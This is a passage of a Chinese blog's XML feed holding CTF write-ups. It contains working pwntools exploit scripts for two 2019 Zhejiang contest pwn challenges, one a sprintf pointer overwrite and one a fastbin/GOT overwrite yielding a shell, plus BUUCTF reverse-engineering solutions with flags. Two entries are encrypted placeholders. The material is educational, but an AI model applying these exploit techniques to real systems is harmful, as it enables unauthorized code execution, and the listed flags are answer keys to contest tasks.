      <link href="/2019/10/04/CTF-Pwn-realloc_malloc_calloc%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/10/04/CTF-Pwn-realloc_malloc_calloc%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="d79ede1ed23d022a74bee52a09a92841a42f3cf1369b751239ed68b9556ff8c2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-19年浙江省大学生网络安全大赛</title>
      <link href="/2019/09/23/CTF-19%E5%B9%B4%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2019/09/23/CTF-19%E5%B9%B4%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="CTF-19年浙江省大学生网络安全大赛"><a href="#CTF-19年浙江省大学生网络安全大赛" class="headerlink" title="CTF-19年浙江省大学生网络安全大赛"></a>CTF-19年浙江省大学生网络安全大赛</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x1-login"><a href="#0x1-login" class="headerlink" title="0x1 login"></a>0x1 login</h2><h3 id="这道题是用C-写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转"><a href="#这道题是用C-写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转" class="headerlink" title="这道题是用C++写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转"></a>这道题是用C++写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> _____   _  ____ _____ _____   _                _       </span><br><span class="line">|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  </span><br><span class="line">  / /_  | | |     | | | |_    | |   / _ \ / _` | | '_ \ </span><br><span class="line"> / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |</span><br><span class="line">/____\___/ \____| |_| |_|     |_____\___/ \__, |_|_| |_|</span><br><span class="line">                                          |___/         </span><br><span class="line">Please enter username: admin</span><br><span class="line">Please enter password: 2jctf_pa5sw0rd</span><br><span class="line">Password accepted: Password accepted: </span><br><span class="line"></span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system-“-bin-sh”-的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell"><a href="#接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system-“-bin-sh”-的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell" class="headerlink" title="接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system(“/bin/sh”)的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell"></a>接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system(“/bin/sh”)的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell</h3><h3 id="Exp如下："><a href="#Exp如下：" class="headerlink" title="Exp如下："></a>Exp如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./login")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">payload = "admin\x00"</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">payload = "2jctf_pa5sw0rd\x00"</span><br><span class="line">payload += "aaaabaaac\x00aadaaaeaaafaaagaaahayyyyyyyyyyyyyyyyyyyyyyyyyyy" + p64(0x400E9E)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-easyheap"><a href="#0x2-easyheap" class="headerlink" title="0x2 easyheap"></a>0x2 easyheap</h2><h3 id="堆题先检查保护"><a href="#堆题先检查保护" class="headerlink" title="堆题先检查保护"></a>堆题先检查保护</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pig@ubuntu:$ checksec easyheap </span><br><span class="line">[*] '/home/pig/Pig/CTF/ShengSai/19.9.21/pwn/easyheap/easyheap'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">`</span><br></pre></td></tr></tbody></table></figure></div><h3 id="没有开PIE-且-没有GOT保护，先想到覆盖free-GOT"><a href="#没有开PIE-且-没有GOT保护，先想到覆盖free-GOT" class="headerlink" title="没有开PIE 且 没有GOT保护，先想到覆盖free_GOT"></a>没有开PIE 且 没有GOT保护，先想到覆盖free_GOT</h3><h3 id="然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free-GOT为system-PLT，然后free一个内容为-bin-sh的堆块即可执行system-“-bin-sh-x00”"><a href="#然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free-GOT为system-PLT，然后free一个内容为-bin-sh的堆块即可执行system-“-bin-sh-x00”" class="headerlink" title="然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free_GOT为system_PLT，然后free一个内容为/bin/sh的堆块即可执行system(“/bin/sh\x00”)"></a>然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free_GOT为system_PLT，然后free一个内容为/bin/sh的堆块即可执行system(“/bin/sh\x00”)</h3><h2 id="具体步骤如下"><a href="#具体步骤如下" class="headerlink" title="具体步骤如下"></a>具体步骤如下</h2><h3 id="申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin-attack攻击chunk-list，然后覆盖第一个堆块为free-GOT，然后通过edit功能修改free-GOT为system-PLT，同时第二个堆块的内容为-bin-sh-x00，free掉第二个堆块即可拿到shell"><a href="#申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin-attack攻击chunk-list，然后覆盖第一个堆块为free-GOT，然后通过edit功能修改free-GOT为system-PLT，同时第二个堆块的内容为-bin-sh-x00，free掉第二个堆块即可拿到shell" class="headerlink" title="申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin attack攻击chunk_list，然后覆盖第一个堆块为free_GOT，然后通过edit功能修改free_GOT为system_PLT，同时第二个堆块的内容为/bin/sh\x00，free掉第二个堆块即可拿到shell"></a>申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin attack攻击chunk_list，然后覆盖第一个堆块为free_GOT，然后通过edit功能修改free_GOT为system_PLT，同时第二个堆块的内容为/bin/sh\x00，free掉第二个堆块即可拿到shell</h3><h3 id="Exp如下：-1"><a href="#Exp如下：-1" class="headerlink" title="Exp如下："></a>Exp如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easyheap")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.sendlineafter("Your choice :","2")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter("Your choice :","1")</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendlineafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter("Your choice :","3")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./easyheap")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">free(2)</span><br><span class="line">payload = '/bin/sh\x00'</span><br><span class="line">payload = payload.ljust(0x68,'a')</span><br><span class="line">payload += p64(0x71) + p64(0x6020ad)</span><br><span class="line">edit(1,0x200,payload)</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">payload = '\xaa' * 3 + p64(0) * 4 + p64(elf.got['free'])</span><br><span class="line">edit(3,len(payload) + 0x100,payload)</span><br><span class="line">edit(0,9,p64(elf.plt['system']))</span><br><span class="line">free(1)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-KernelPwn-基础</title>
      <link href="/2019/09/15/CTF-KernelPwn-%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/09/15/CTF-KernelPwn-%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="bf9e4de1892addceb4e950773114d8770ab27df1827cf6ffb4d80c76d5b6246d"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-BUUCTF-Reverse刷题之旅-(1)</title>
      <link href="/2019/09/11/CTF-BUUCTF-Reverse%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
      <url>/2019/09/11/CTF-BUUCTF-Reverse%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-xor"><a href="#0x01-xor" class="headerlink" title="0x01 xor"></a>0x01 xor</h2><h3 id="导入ida，发现是一个f-x-f-x-f-x-1-的加密方式，直接逆出来就好了，脚本如下"><a href="#导入ida，发现是一个f-x-f-x-f-x-1-的加密方式，直接逆出来就好了，脚本如下" class="headerlink" title="导入ida，发现是一个f(x) = f(x)^f(x-1)的加密方式，直接逆出来就好了，脚本如下"></a>导入ida，发现是一个f(x) = f(x)^f(x-1)的加密方式，直接逆出来就好了，脚本如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">encode = 'f\nk\x0cw&O.@\x11x\x0dZ;U\x11p\x19F\x1Fv"M#D\x0Eg\x06h\x0FG20'</span><br><span class="line">flag = ''</span><br><span class="line">flag+='f'</span><br><span class="line">for i in range(1,len(encode)):</span><br><span class="line">flag += chr(ord(encode[i])^ord(encode[i-1]))</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-QianQiuWanDai-YiTongJiangHu"><a href="#flag-QianQiuWanDai-YiTongJiangHu" class="headerlink" title="flag{QianQiuWanDai_YiTongJiangHu}"></a>flag{QianQiuWanDai_YiTongJiangHu}</h3><h2 id="0x02-新年快乐"><a href="#0x02-新年快乐" class="headerlink" title="0x02 新年快乐"></a>0x02 新年快乐</h2><h3 id="程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag"><a href="#程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag" class="headerlink" title="程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag"></a>程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag</h3><h3 id="flag-HappyNewYear"><a href="#flag-HappyNewYear" class="headerlink" title="flag{HappyNewYear!}"></a>flag{HappyNewYear!}</h3><h2 id="0x03-reverse-2"><a href="#0x03-reverse-2" class="headerlink" title="0x03 reverse_2"></a>0x03 reverse_2</h2><h3 id="导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下"><a href="#导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下" class="headerlink" title="导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下"></a>导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag字符串为hacking_for_fun</span><br><span class="line">将i和r换成1，然后加上flag{}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-hack1ng-fo1-fun"><a href="#flag-hack1ng-fo1-fun" class="headerlink" title="flag{hack1ng_fo1_fun}"></a>flag{hack1ng_fo1_fun}</h3><h2 id="0x04-内涵的软件"><a href="#0x04-内涵的软件" class="headerlink" title="0x04 内涵的软件"></a>0x04 内涵的软件</h2><h3 id="导入ida直接看到flag"><a href="#导入ida直接看到flag" class="headerlink" title="导入ida直接看到flag"></a>导入ida直接看到flag</h3><h3 id="flag-49d3c93df25caad81232130f3d2ebfad"><a href="#flag-49d3c93df25caad81232130f3d2ebfad" class="headerlink" title="flag{49d3c93df25caad81232130f3d2ebfad}"></a>flag{49d3c93df25caad81232130f3d2ebfad}</h3><h2 id="0x05-reverse3"><a href="#0x05-reverse3" class="headerlink" title="0x05 reverse3"></a>0x05 reverse3</h2><h3 id="导入ida，发现加密后的字符串为"><a href="#导入ida，发现加密后的字符串为" class="headerlink" title="导入ida，发现加密后的字符串为"></a>导入ida，发现加密后的字符串为</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e3nifIH9b_C@n@dH</span><br></pre></td></tr></tbody></table></figure></div><p>两次加密，先是base64加密，然后每一位字符加上自己位置的偏移</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">encode = "e3nifIH9b_C@n@dH"</span><br><span class="line">decode1 = ''</span><br><span class="line">flag = ''</span><br><span class="line">for i in range(0,len(encode)):</span><br><span class="line">decode1 += chr(ord(encode[i]) - i)</span><br><span class="line">print base64.b64decode(decode1)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-i-l0ve-you"><a href="#flag-i-l0ve-you" class="headerlink" title="flag{i_l0ve_you}"></a>flag{i_l0ve_you}</h3><h2 id="0x06-Java逆向解密"><a href="#0x06-Java逆向解密" class="headerlink" title="0x06 Java逆向解密"></a>0x06 Java逆向解密</h2><p>把class反编译一下，得到以下代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import java.io.PrintStream;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Reverse</span><br><span class="line">{</span><br><span class="line">  public static void main(String[] args)</span><br><span class="line">  {</span><br><span class="line">    Scanner s = new Scanner(System.in);</span><br><span class="line">    System.out.println("Please input the flag :");</span><br><span class="line">    String str = s.next();</span><br><span class="line">    System.out.println("Your input is:");</span><br><span class="line">    System.out.println(str);</span><br><span class="line">    char[] stringArr = str.toCharArray();</span><br><span class="line">    Encrypt(stringArr);</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  public static void Encrypt(char[] arr)</span><br><span class="line">  {</span><br><span class="line">    ArrayList<integer> Resultlist = new ArrayList();</integer></span><br><span class="line">    for (int i = 0; i < arr.length; i++)</span><br><span class="line">    {</span><br><span class="line">      int result = arr[i] + '@' ^ 0x20;</span><br><span class="line">      Resultlist.add(Integer.valueOf(result));</span><br><span class="line">    }</span><br><span class="line">    int[] KEY = { 180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65 };</span><br><span class="line">    ArrayList<integer> KEYList = new ArrayList();</integer></span><br><span class="line">    for (int j = 0; j < KEY.length; j++) {</span><br><span class="line">      KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line">    }</span><br><span class="line">    System.out.println("Result:");</span><br><span class="line">    if (Resultlist.equals(KEYList)) {</span><br><span class="line">      System.out.println("Congratulations!");</span><br><span class="line">    } else {</span><br><span class="line">      System.err.println("Error!");</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>简单分析了就一下就可以写出解密算法</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encrypto = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]</span><br><span class="line">flag = ''</span><br><span class="line">for i in encrypto:</span><br><span class="line">flag += chr(i - ord('@')^0x20)</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-This-is-the-flag"><a href="#flag-This-is-the-flag" class="headerlink" title="flag{This_is_the_flag_!}"></a>flag{This_is_the_flag_!}</h3><h2 id="0x07-简单注册器"><a href="#0x07-简单注册器" class="headerlink" title="0x07 简单注册器"></a>0x07 简单注册器</h2><h3 id="导入jeb，搜索flag-找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下："><a href="#导入jeb，搜索flag-找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下：" class="headerlink" title="导入jeb，搜索flag{找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下："></a>导入jeb，搜索flag{找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String args[]) {</span><br><span class="line">        int v11 = 31;</span><br><span class="line">        int v9 = 2;</span><br><span class="line">        int v2 = 1;</span><br><span class="line">        char[] v5 = "dd2940c04462b4dd7c450528835cca15".toCharArray();</span><br><span class="line">        v5[v9] = ((char)(v5[v9] + v5[3] - 50));</span><br><span class="line">        v5[4] = ((char)(v5[v9] + v5[5] - 48));</span><br><span class="line">        v5[30] = ((char)(v5[v11] + v5[9] - 48));</span><br><span class="line">        v5[14] = ((char)(v5[27] + v5[28] - 97));</span><br><span class="line">        int v4;</span><br><span class="line">        for(v4 = 0; v4 < 16; ++v4) {</span><br><span class="line">            char v0 = v5[31 - v4];</span><br><span class="line">            v5[31 - v4] = v5[v4];</span><br><span class="line">            v5[v4] = v0;</span><br><span class="line">        }</span><br><span class="line">        System.out.println(v5);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-59acc538825054c7de4b26440c0999dd"><a href="#flag-59acc538825054c7de4b26440c0999dd" class="headerlink" title="flag{59acc538825054c7de4b26440c0999dd}"></a>flag{59acc538825054c7de4b26440c0999dd}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-技巧</title>
      <link href="/2019/09/08/Linux-%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/09/08/Linux-%E6%8A%80%E5%B7%A7/</url>
      
